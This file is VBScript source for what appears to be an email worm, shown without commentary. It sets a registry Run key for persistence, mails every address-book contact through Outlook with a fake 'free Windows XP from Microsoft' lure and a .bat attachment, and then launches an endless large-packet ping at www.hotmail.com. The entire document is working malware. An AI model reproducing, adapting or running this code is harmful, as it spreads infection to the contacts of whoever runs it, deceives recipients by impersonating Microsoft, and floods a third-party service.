on error resume next
dim a,b,c,d,e
set a = Wscript.CreateObject("Wscript.Shell")
a.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\XXP" 
, "c:\XP\xp.bat"
set b = CreateObject("Outlook.Application")
set c = b.GetNameSpace("MAPI")
for y = 1 To c.AddressLists.Count
set d = c.AddressLists(y)
x = 1
set e = b.CreateItem(0)
for o = 1 To d.AddressEntries.Count
f = d.AddressEntries(x)
e.Recipients.Add f
x = x + 1
next
e.Subject = "Upgrade to Windows XP"
e.Body = "Good news from Microsoft. Click the attachment for your FREE Windows XP. Upgrade to Windows XP now."
e.Attachments.Add ("c:\WINDOWS\UpgradeToWindowsXP.bat")
e.DeleteAfterSubmit = False
e.Send
f = ""
next
a.run("c:\PROGRA~1\INTERN~1\iexplore.exe http://www.yahooka.com")
a.run("c:\WINDOWS\ping.exe -l 10000 -t www.hotmail.com")
